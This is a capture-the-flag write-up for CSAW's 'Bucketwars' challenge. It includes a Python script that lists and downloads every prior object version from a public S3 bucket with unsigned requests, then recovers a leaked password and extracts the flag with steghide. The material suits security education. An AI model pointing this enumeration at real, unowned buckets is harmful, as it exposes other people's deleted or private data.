# Writeup for Bucketwars challenge of CSAW CTF 

The bucket url can be found by triggering any error ike 404.


Firstly,after some thinking the hint "we don't make mistakes in these parts" could be pointing towards the concept of **versioning** in Amazon S3 buckets. 
In hindsite the other endpoints had text which hinted towards versioning as well.

So we run a script to fetch the version list and then all the older version files as well from the bucket using the filenames from the versions file obtained:

```
from subprocess import check_output
import json

BUCKET_NAME = "bucketwars.ctf.csaw.io"


def getFiles():
    cmd_output = check_output(
        f'aws s3api list-object-versions --no-sign-request --bucket {BUCKET_NAME} --prefix "" --output json', shell=True)

    return json.loads(cmd_output)["Versions"]


def getFile(file):
    filename, VersionId = file["Key"], file["VersionId"]

    try:
        output_filename = f"{filename.split(".")[0]}_{VersionId.strip()}.{
            filename.split(".")[1]}"
    except IndexError:
        output_filename = f"{filename}{VersionId}"

    check_output(
        f"aws s3api get-object --no-sign-request --bucket {BUCKET_NAME} --key {filename} --version-id {VersionId} {output_filename}", shell=True)

    print(file["LastModified"], f"""{
          int(file["Size"])/1000} KB""", output_filename, sep="\t")


# files = json.loads(open("versions.json").read())["Versions"]
files = getFiles()

print(f"Pulling [{len(files)}] files")
print("Timestamp\tSize\tFilename_VersionId")

for file in files:
    getFile(file)
	
```
The versions.json looks like this:
```
{
    "Versions": [
        {
            "ETag": "\"666d672ebcbe877d88a58f691d36bad3\"",
            "Size": 250563,
            "StorageClass": "STANDARD",
            "Key": "404.jpeg",
            "VersionId": "4jvOLAIbh0mOi34Kntv1ClMpv_BWuNkz",
            "IsLatest": false,
            "LastModified": "2024-08-05T00:27:09.000Z"
        },
        {
            "ETag": "\"9a5824c100e6975c203e2ae517c9ec0d\"",
            "Size": 1555,
            "StorageClass": "STANDARD",
            "Key": "index_v1.html",
            "VersionId": "CFNz2JPIIJfRlNfnVx8a45jgh0J90KxS",
            "IsLatest": false,
            "LastModified": "2024-08-05T00:20:08.000Z"
        },
        {
            "ETag": "\"130f7fdffa9c3a0e24853b651dfe07ac\"",
            "Size": 1571,
            "StorageClass": "STANDARD",
            "Key": "index_v1.html",
            "VersionId": "t6G6A20JCaF5nzz6KuJR6Pj1zePOLAdB",
            "IsLatest": false,
            "LastModified": "2024-08-05T00:19:57.000Z"
        },
        {
            "ETag": "\"2102e20ca90b0cec249c85e4cbed5f21\"",
            "Size": 1575,
            "StorageClass": "STANDARD",
            "Key": "index_v2.html",
            "VersionId": "null",
            "IsLatest": true,
            "LastModified": "2024-08-05T00:15:03.000Z"
        },
```
In one of the previous version files we get this comment:

```
    Oh it can't be
    <!-- Note to self: be sure to delete this password: versions_leaks_buckets_oh_my --> 
```

And we find a image in a previous version of the v1 endpoint ( <b>index_v1_t6G6A20JCaF5nzz6KuJR6Pj1zePOLAdB.html</b> ) and what's different about this is it was stored in another bucket and not in the same provider as the other images.

Running steghide on the image with the above password gives the flag.

Note: The bucket was taken down quite early after the ctf ended so could not repoduce the steps to add images for reference.
